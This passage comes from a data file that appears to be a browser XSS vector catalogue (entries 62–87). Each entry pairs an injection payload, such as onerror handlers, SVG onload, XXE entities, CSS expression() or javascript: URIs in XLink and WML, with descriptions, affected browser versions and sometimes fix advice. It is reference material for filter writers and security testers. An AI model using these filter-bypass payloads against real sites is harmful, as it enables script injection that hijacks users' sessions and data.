        'reporter'   : 'Gareth, LeverOne, Renaud Lifchitz'
    },
    { /* ID 62 - Simulating attribute in IE */
        'id'         : 62,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Simulating attribute in IE',
            'ja' : '',
            'ru' : 'Симуляция атрибута в IE',
            'de' : ''
        },
        'data'       : '<x \'="foo"><x foo=\'><img src=x onerror=alert(1)//\'>',
        'description': {
            'en' : 'This vector is simulated using in IE a single quote as an attribute to trick filters',
            'ja' : '',
            'ru' : 'Этот вектор симулирует использование в IE одиночной кавычки в качестве атрибута, чтобы обмануть фильтры.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': [
                '6.0', '7.0', '8.0', '9.0'
            ]                       
        },
        'tags'       : ['xss', 'javascript', 'attribute', 'simulating', 'parser', 'regex'],
        'reporter'   : 'Algol, LeverOne, White Jordan'
    },    
	{ /* ID 63 - JavaScript execution via src attribute */
        'id'         : 63,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via src attribute',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<embed src="%js_uri_alert%">\r\n<img src="%js_uri_alert%">\r\n<image src="%js_uri_alert%">\r\n<script src="%js_uri_alert%">',
        'description': {
            'en' : 'Most browsers allow executing JavaScript via <IFRAME> "src" attributes - this is expected behavior. Interesting is though that this can be extended to other tags too. Opera 10, Chrome and Firefox execute JavaScript by using the <EMBED> tag while Opera 10 and Opera Mobile even execute JavaScript with <SCRIPT>, <IMG> and <IMAGE> and a matching "src" attribute as well as early Internet Explorer versions.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure "src" attributes can never contain non-HTTP-URLs to prevent XSS or worse.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['1.5', '2.x', '3.x'],
			'chrome': ['4.0', '5.0', '6.0'],
            'opera': ['8.x', '9.x', '10.0', 'mobile'],
            'internet explorer': ['6.0', '7.0'],
			'safari': ['3.0', '4.0']
        },
        'tags'       : ['xss', 'javascript', 'src', 'safari', 'chrome', 'opera', 'firefox', 'internet explorer'],
        'reporter'   : '.mario'
    },    
    { /* ID 64 - Arbitrary payload injection via XML External Entities (XXE) */
        'id'         : 64,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Arbitrary payload injection via XML External Entities (XXE)',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<!DOCTYPE x[<!ENTITY x SYSTEM "%xxe_path%">]><y>&x;</y>',
        'attachment' : {
            'required_mime' : '',
            'samedomain'    : '1',            
            'path'          : '',
            'name'          : '',
            'raw'           : '<script xmlns="http://www.w3.org/1999/xhtml">%js_alert%</script>'
        },
        'description': {
            'en' : 'Chrome and Safari allow using external XML entities to reference payload for an entity. The example shows that the entity &x; is now being filled with the content of the given file. The document must be delivered as XML or XHTML.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://xmlwriter.net/xml_guide/entity_declaration.shtml', 'http://www.w3.org/TR/REC-xml/'],
        'howtofix'   : {
            'en' : 'In case an attacker can inject data into the DOCTYPE area of the targeted website it\'s easy to fool filtering mechanisms since the actual payload is hidden in a harmless looking entity. Make sure no injections in that area are possible.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'chrome': ['3.0', '4.0', '5.0', '6.0'],
            'safari': ['3.0', '4.0']
        },
        'tags'       : ['xss', 'javascript', 'xxe', 'safari', 'chrome', 'xml', 'entities', 'doctype'],
        'reporter'   : '.mario'
    },    
    { /* ID 65 - SVG onload injection without g tag */
        'id'         : 65,
        'category'   : 'svg', 
        'name'       : {
            'en' : 'SVG element allows automatic execution of onload attribute without other SVG elements.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<svg onload="%js_uri_alert%" xmlns="http://www.w3.org/2000/svg"></svg>',        
        'description': {
            'en' : 'SVG tags allow code to be executed with onload without any other elements.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'howtofix'   : {
            'en' : 'Not really a bug to fix, this is desired behaviour and only increases XSS scope.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'chrome': ['4.0', '5.0', '6.0'],
            'safari': ['3.4', '4.x'],
			'firefox': ['3.0', '3.5', '3.6', '3.7'],
			'opera': ['9.x', '10.x']
        },
        'tags'       : ['xss', 'svg', 'onload','chrome','firefox','safari','opera'],
        'reporter'   : 'gareth'
    },
    { /* ID 66 - Opera XML-stylesheets executing JavaScript (2) */
        'id'         : 66,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Opera XML-stylesheets executing JavaScript (2)',
            'ja' : '',
            'ru' : 'Вызов javascript из тега xml-stylesheet в Opera',
            'de' : ''
        },
        'data'       : '<?xml version="1.0"?>\n<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version=\'1.0\' xmlns:xsl=\'http://www.w3.org/1999/XSL/Transform\' id=\'xss\'%3E%3Cxsl:output method=\'html\'/%3E%3Cxsl:template match=\'/\'%3E%3Cscript%3E%js_alert%%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>\n<root/>',
        'description': {
            'en' : 'Opera supports xml-stylesheet via data URIs. There are many ways to execute javascript using the XSL (XSLT). If you put this code in an external file on the same domain, then it will work in all browsers. It is also possible appeal to the code of the stylesheet by id (href = "# xss"), when the stylesheet implemented in the current document.',
            'ja' : '',
            'ru' : 'Opera поддерживает загрузку xml-таблицы стилей с помощью data-схемы. Существует очень много способов выполнить javascript, используя XSL (XSLT). Если вы разместите приведенный код таблицы стилей во внешнем файле, расположенном на том же домене, то он cработает во всех браузерах. Допустимо также обращение к коду таблицы стилей посредством ид (href="#xss"), если таблица стилей внедрена в текущий документ.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': [
                '8.0', '9.0', '10.x', 'mobile'
            ]
        },
        'tags'       : ['xss', 'javascript', 'opera', 'xslt', 'xsl', 'stylesheet', 'xml'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 67 - XML ATTLIST declaration causing JavaScript execution */
        'id'         : 67,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'XML ATTLIST declaration causing JavaScript execution',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<!DOCTYPE x [\r\n\t<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "x" onerror CDATA "%js_alert%">\r\n]><img />',
        'description': {
            'en' : 'XML ATTLIST declarations can be used to create attributes and assign values for matching tags inside the DOCTYPE declaration. By chosing the right namespace and attribute combinations it\'s possible to create an ATTLIST declaration causing JavaScript execution without user interaction.', 
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://xmlwriter.net/xml_guide/attlist_declaration.shtml'],
        'howtofix'   : {
            'en' : 'In case a website is being delivered as XML or XHTML make sure an attacker has no possibility to inject data into the DOCTYPE or create new ATTLIST directives.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'chrome': ['4.0', '5.0', '6.0'],
            'safari': ['3.0', '4.0'],
            'firefox': ['3.0', '3.5', '3.6', '3.7'],        
            'opera': ['8.0', '9.0', '10.x', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'attlist', 'doctype', 'chrome', 'firefox', 'safari'],
        'reporter'   : '.mario'
    },
    { /* ID 68 - Passive JavaScript execution via XLinks */
        'id'         : 68,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Passive JavaScript execution via XLinks',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">\r\n\t<html:style /><x xlink:href="%js_uri_alert%" xlink:type="simple">XXX</x>\r\n</doc>',
        'description': {
            'en' : 'Gecko based browsers like Firefox allow using XLinks. Those can be equipped with a JavaScript URI to execute JavaScript in case the user clicks on one of those XLinks.', 
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/xlink/', 'http://www.w3.org/TR/2010/REC-xlink11-20100506/'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['3.0', '3.5', '3.6', '3.7']
        },
        'tags'       : ['xss', 'javascript', 'xlinks', 'firefox', 'xml'],
        'reporter'   : '.mario'
    },
    { /* ID 69 - Opera WML JavaScript execution via timer event */
        'id'         : 69,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Opera WML JavaScript execution via timer event',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="%js_uri_alert%"/></onevent><timer value="1"/></card>',
        'description': {
            'en' : 'Opera supports WML files - Wireless Markup Language. As soon as a file has the extension .wml Opera assumes it\'s a WML and renders it accordingly. With a timer event and a connected redirect it\'s possible to execute JavaScript without user interaction.', 
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://www.w3schools.com/wap/default.asp', 'http://www.w3schools.com/wmlscript/default.asp'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['9.x', '10.x', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'wmlscript', 'wml', 'opera', 'mobile', 'timer'],
        'reporter'   : '.mario'
    },
    { /* ID 70 - JavaScript execution via IE filters and onfilterchange */
        'id'         : 70,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via IE filters and onfilterchange',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<div style=width:1px;filter:glow onfilterchange=%js_alert%>x',
        'description': {
            'en' : 'In some situations it\'s possible to trigger a filterchange event by using just one filter as the example shows. Also the short filter notation is being used which is supported by all IE versions despite the information in the documentation. In compatibility mode to IE8+ you can use the property "-ms-filter".', 
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms532847%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'filter', 'css', 'style', 'onfilterchange', 'internet explorer'],
        'reporter'   : '.mario, LeverOne'
    },
    { /* ID 71 - Closing tags accepting style attributes */
        'id'         : 71,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Closing tags accepting style attributes',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '</ style=?=-=expression\\28%js_write%\\29>',
        'description': {
            'en' : 'An unnamed closing tag can still contain style attributes on IE as the example shows. For extra obfuscation a bogus CSS property is being used to execute the JavaScript via expression() combined with CSS escapes.', 
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms537634%28VS.85%29.aspx', 'http://www.w3.org/TR/CSS2/syndata.html'],
        'howtofix'   : {
            'en' : 'Make sure the HTML filter you use deals with unnamed closing tags and doesn\'t consider them to be plain text. Also be aware of CSS escapes and how they can completely obfuscate any style info inside <STYLE> tags and "style" attributes.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0']
        },
        'tags'       : ['xss', 'javascript', 'closing tag', 'css', 'style', 'expression', 'internet explorer'],
        'reporter'   : 'Gareth, .mario'
    },
    { /* ID 72 - XSS via formaction - requiring user interaction (2) */
        'id'         : 72, 
        'category'   : 'html5', 
        'name'       : {
            'en' : 'XSS via formaction - requiring user interaction (2)',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<form><button formaction="%js_uri_alert%">X',
        'description': {
            'en' : 'A vector displaying the HTML5 "formaction" capabilities for form hijacking. Note that this variation does not use the "id" and "form" attributes to connect button and form.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#attr-fs-formaction'],
        'howtofix'   : {
            'en' : 'Don\'t allow users to submit markup containing "form" and "formaction" attributes or transform them to bogus attributes.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'browsers'   : {
            'opera': ['10.5', '10.6', 'mobile']
        },
        'tags'       : ['xss', 'html5', 'opera', 'formaction', 'javascript', 'button'],
        'reporter'   : '.mario'
    },
    { /* ID 73 - Server-sent events - Opera and <EVENT-SOURCE> tags (1) */
        'id'         : 73,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'Server-sent events - Opera and <EVENT-SOURCE> tags (1)',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<event-source src="%event_path%" onload="%js_alert%">',
        'attachment' : {
            'required_mime' : '',
            'samedomain'    : '0',            
            'path'          : 'http://heideri.ch/jso/event.php',
            'name'          : 'event.php',
            'raw'           : '<?php\r\nheader("Content-Type: application/x-dom-event-stream");\r\ndie("Event: load\\ndata: \\n\\n");\r\n?>'
        },
        'description': {
            'en' : 'Opera allows using <EVENT-SOURCE> elements. In case the "src" attribute points to a valid cross domain source it\'s possible to have the element listen for events and the containing data.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://hixie.ch/specs/html/server-sent-events/server-sent-events'],
        'howtofix'   : {
            'en' : 'Make sure users cannot influence the source of <EVENT-SOURCE> elements and don\'t whitelist the tag itself inside user submitted markup.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['8.x', '9.x', '10.x', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'event-source', 'opera', 'sse'],
        'reporter'   : '.mario'
    },
    { /* ID 74 - Server-sent events - Opera and <EVENT-SOURCE> tags (2) */
        'id'         : 74,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'Server-sent events - Opera and <EVENT-SOURCE> tags (2)',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<a href="%js_uri_alert%"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">',
        'description': {
            'en' : 'Opera allows using <EVENT-SOURCE> tags to receive server-sent events. In this example a data URI is being used as an event source triggering a click on another HTML element. In an attack scenario an XSS requiring user interaction can be turned into an active script execution this way.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://hixie.ch/specs/html/server-sent-events/server-sent-events'],
        'howtofix'   : {
            'en' : 'Make sure users cannot influence the source of <EVENT-SOURCE> elements and don\'t whitelist the tag itself inside user submitted markup.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['8.x', '9.x', '10.x', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'event-source', 'opera', 'sse'],
        'reporter'   : '.mario'
    },
    { /* ID 75 - E4X used to close an opening <SCRIPT> tag and {} evaluation */
        'id'         : 75,
        'category'   : 'e4x', 
        'name'       : {
            'en' : 'E4X used to close an opening <SCRIPT> tag and {} evaluation',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<script<{alert(1)}/></script </>',
        'description': {
            'en' : 'In this example an E4X object is being used to close a half-open <SCRIPT> tag and evaluate code in the global scope afterwards via the E4X curly bracket delimiters. This technique will not work anymore as soon Firefox uses the already integrated HTML5 parser (html5.enable=true)',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['https://developer.mozilla.org/en/E4X', 'https://bugzilla.mozilla.org/show_bug.cgi?id=564706'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['1.5', '2.x', '3.x']
        },
        'tags'       : ['xss', 'javascript', 'e4x', 'script', 'parser', 'regex'],
        'reporter'   : '.mario, Gareth'
    },
    { /* ID 76 - Arbitrary payload injection via XML external DTD in IE */
        'id'         : 76,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Arbitrary payload injection via XML external DTD in IE',
            'ja' : '',
            'ru' : 'Инъекция удаленного javascript-кода через внешнее определение типа документа (DTD)',
            'de' : ''
        },
        'data'       : '<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>',
        'attachment' : {
            'required_mime' : '',
            'samedomain'    : '0',            
            'path'          : 'http://heideri.ch/jso/test.dtd',
            'name'          : 'test.dtd',
            'raw'           : '<!ENTITY x "&#x3C;html:img&#x20;src=\'x\'&#x20;xmlns:html=\'http://www.w3.org/1999/xhtml\'&#x20;onerror=\'%js_alert%\'/&#x3E;">'
        },
        'description': {
            'en' : 'IE requires to display html-tags of any users stylesheet and namespace prefix "html".',
            'ja' : '',
            'ru' : 'IE для отображения HTML-тегов требует обязательного наличия на xml-странице пользовательской таблицы стилей, а также объявления соответствующего пространства имен с префиксом "html".',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0']
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'xml', 'dtd', 'arbitrary'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 77 -  XML JavaScript execution via CSS in IE  */
        'id'         : 77,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'XML JavaScript execution via style attribute in IE',
            'ja' : '',
            'ru' : 'Выполнение javascript c помощью стилевого атрибута в IE на XML-странице',
            'de' : ''
        },
        'data'       : '<?xml-stylesheet type="text/css"?><root style="x:expression(%js_write%)"/>',
        'description': {
            'en' : 'IE supports the style attribute to the xml-pages. So JavaScript can be executed in any tag.',
            'ja' : '',
            'ru' : 'IE поддерживает стилевой атрибут на xml-страницах. Таким образом javascript может быть выполнен в любом теге.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0']
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'xml', 'css', 'style'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 78 - Arbitrary payload injection via XSL + XDR-schema in IE */
        'id'         : 78,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Arbitrary payload injection via XSL + XDR-schema in IE',
            'ja' : '',
            'ru' : 'Инъекция удаленного javascript-кода в IE с помощью XSL и XDR-схемы',
            'de' : ''
        },
        'data'       : '<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:%xdr_path%"/>',
        'attachment' : {
            'required_mime' : '',
            'samedomain'    : '0',            
            'path'          : 'http://heideri.ch/jso/test.xdr',
            'name'          : 'test.xdl',
            'raw'           : '<?xml version="1.0"?>\n<Schema name="x" xmlns="urn:schemas-microsoft-com:xml-data">\n<ElementType name="img">\n<AttributeType name="src" required="yes" default="x"/>\n<AttributeType name="onerror" required="yes" default="%js_alert%"/>\n<attribute type="src"/>\n<attribute type="onerror"/>\n</ElementType>\n</Schema>'
        },
        'description': {
            'en' : 'The namespace "html" is automatically determined using XSL. Missing attributes for the "img" tag is obtained from the XDR-schema.',
            'ja' : '',
            'ru' : 'Пространство имен "html" автоматически определяется IE с помощью XSL-таблицы. Недостающие атрибуты для тега "img" заимствуются из XDR-схемы.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms256208(v=VS.100).aspx'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0']
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'xml', 'xdr', 'arbitrary', 'xml data reduced', 'xsl'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 79 - <OBJECT> tag and Flash files executing JavaScript */
        'id'         : 79,
        'category'   : 'html', 
        'name'       : {
            'en' : '<OBJECT> tag and Flash files executing JavaScript',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<object data="%swf_path%"></object>',
        'description': {
            'en' : '<OBJECT> tags directly including Flash files via the "data" attribute - allowing execution of JavaScript and more without user interaction.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'attachment' : {
            'required_mime' : '',
            'samedomain'    : '0',            
            'path'          : 'http://heideri.ch/jso/test.swf',
            'name'          : 'test.swf',
            'raw'           : 'class XSS {public static function main() {\r\nflash.Lib.getURL(new flash.net.URLRequest("javascript:alert(1);"),"_top");\r\n}}'
        },        
        'urls'    : ['http://www.w3.org/TR/REC-html40/struct/objects.html'],
        'howtofix'   : {
            'en' : 'Make sure users cannot control the "src" and "data" attribute values of <OBJECT> tags - or better don\'t whitelist <OBJECT> tags in user submitted markup at all.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'safari': ['3.4', '4.x'],
            'firefox': ['1.5', '2.x', '3.x'],        
            'opera': ['10.x', 'mobile'],
            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'object', 'flash', 'swf', 'safari', 'firefox', 'opera'],
        'reporter'   : '.mario'
    },
    { /* ID 80 - IE6 and halfwidth/fullwidth Unicode characters */
        'id'         : 80,
        'category'   : 'css', 
        'name'       : {
            'en' : 'IE6 and halfwidth/fullwidth Unicode characters',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(write(1))}</style>',
        'description': {
            'en' : 'This example shows how halfwidth/fullwidth Unicode characters can be used on IE6 to substitute characters from the ASCII range. Note that those characters have been used in the example to create the term "expression".',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_Unicode_block'],
        'howtofix'   : {
            'en' : 'In case your website still has a lot of IE6 users make sure that the range of halfwidth and fullwidth form characters (U+FF00-FFEF) cannot be used in user submitted markup and styles.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0']
        },
        'tags'       : ['xss', 'javascript', 'css', 'expression', 'unicode', 'halfwidth', 'fullwidth', 'internet explorer'],
        'reporter'   : '.mario'
    },
    { /* ID 81 - Active JavaScript execution via XLinks */
        'id'         : 81,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Active JavaScript execution via XLinks',
            'ja' : '',
            'ru' : 'Активный скриптинг с помощью XLinks',
            'de' : ''
        },
        'data'       : '<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="%js_uri_alert%" xlink:type="simple"/>',
        'description': {
            'en' : 'FF support the attribute "xlink:actuate" and can display xlink without additional styles and namespaces "html".',
            'ja' : '',
            'ru' : 'FF поддерживает атрибут "xlink:actuate" и может отобразить xml-ссылку без дополнительных стилей и пространства имен "html".',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/xlink/#actuate-att', 'http://www.w3.org/TR/2010/REC-xlink11-20100506/'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['3.0', '3.5', '3.6', '3.7']
        },
        'tags'       : ['xss', 'javascript', 'xlinks', 'firefox', 'xml'],
        'reporter'   : 'LeverOne, .mario'
    },
    { /* ID 82 - JavaScript execution via XML stylesheet, data URI and expression() */
        'id'         : 82,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'JavaScript execution via XML stylesheet, data URI and expression()',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>',
        'description': {
            'en' : 'Internet Explorer 8 and 9 support data URIs and thus are capable of including stylesheets this way. By using a xml stylesheet tag and a data URI containing an expression() it\'s possible to execute JavaScript without user interaction.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/xml-stylesheet/'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'xml stylesheet', 'css', 'internet explorer', 'expression',  'xml'],
        'reporter'   : '.mario'
    },
    { /* ID 83 - Obfuscation unsafe parameter via wml-variables. */
        'id'         : 83,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Obfuscation unsafe parameter via wml-variables.',
            'ja' : '',
            'ru' : 'Обфускация опасного параметра с использованием wml-переменных',
            'de' : ''
        },
        'data'       : '<x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:%js_alert%"><x:timer value="1"/></x:template>',
        'description': {
            'en' : 'The example demonstrates the use in WML undeclared variables (are ignored). These variables can be declared in the tags "setvar", "input", "select". Namespace indicated for use inside the XML-file. Also inside WML-files can you use a lot of regular HTML-tags.', 
            'ja' : '',
            'ru' : 'Пример демонстрирует использование в WML необъявленных переменных, которые будут игнорироваться. Эти переменные можно объявить в тегах "setvar", "input", "select". Пространство имен указано для использования в XML-файле. Не забывайте, что внутри WML-файлов вы можете использовать множество обычных HTML-тегов. ',
            'de' : ''
        },
        'urls'    : ['http://www.w3schools.com/wap/wml_variables.asp'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['9.x', '10.x', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'wml', 'opera', 'mobile', 'timer', 'variable'],
        'reporter'   : 'LeverOne, .mario'
    },
    { /* ID 84 - Opera JavaScript execution via XML-events handler */
        'id'         : 84,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Opera JavaScript execution via XML-events handler',
            'ja' : '',
            'ru' : 'Выполнение javascript в Opera c помощью обработчика XML-события',
            'de' : ''
        },
        'data'       : '<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="%js_uri_alert%//#x"/>',
        'description': {
            'en' : 'The browser tries to load an external XML-event handler and executed javascript without user interaction.', 
            'ja' : '',
            'ru' : 'Браузер пытается загрузить внешний обработчик XML-события и выполняет javascript',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/xml-events/'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['9.x', '10.x', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'event', 'handler'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 85 - Arbitrary payload injection in Opera via XML-events handler */
        'id'         : 85,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Arbitrary payload injection in Opera via XML-events handler',
            'ja' : '',
            'ru' : 'Инъекция удаленного javascript-кода в Opera c помощью обработчика XML-события',
            'de' : ''
        },
        'data'       : '<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>',
        'attachment' : {
            'required_mime' : '',
            'samedomain'    : '0',            
            'path'          : 'http://heideri.ch/jso/test.evt',
            'name'          : 'test.evt',
            'raw'           : '<script xmlns="http://www.w3.org/1999/xhtml" id="x">%js_alert%</script>'
        },
        'description': {
            'en' : 'The browser loads an external xml-event handler, which contains the javascript-code. This example also works with data URI.', 
            'ja' : '',
            'ru' : 'Браузер загружает внешний обработчик XML-события, который содержит javascript код. Этот пример также будет работать с data-схемой.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/xml-events/'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['9.x', '10.x', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'event', 'handler', 'arbitrary'],
        'reporter'   : 'LeverOne'
    },    
    { /* ID 86 - Passive JavaScript execution via <BODY> and oninput attribute */
        'id'         : 86,
        'category'   : 'html5', 
        'name'       : {
            'en' : 'Passive JavaScript execution via <BODY> and oninput attribute',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<body oninput=%js_alert%><input autofocus>',
        'description': {
            'en' : 'All browsers besides Internet Explorer support the "oninput" event handler around form elements like the given <INPUT>. The event works for the form elements itself, the surrounding form and <BODY> as well as <HTML> tags.', 
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Do not whitelist "oninput" attributes in user submitted markup.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox' : ['3.6', '3.7'], 
            'safari' : ['4.0'], 
            'chrome' : ['4.0', '5.0', '6.0'],
            'opera': ['9.x', '10.x', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'html5', 'oninput', 'form', 'passive', 'event'],
        'reporter'   : 'Skyphire'
    },
    { /* ID 87 - SVG simple passive JavaScript execution via XLink */
        'id'         : 87,
        'category'   : 'svg', 
        'name'       : {
            'en' : 'SVG simple passive JavaScript execution via XLink',
            'ja' : '',
            'ru' : 'Пассивный скриптинг в SVG c помощью XLink',
            'de' : ''
        },
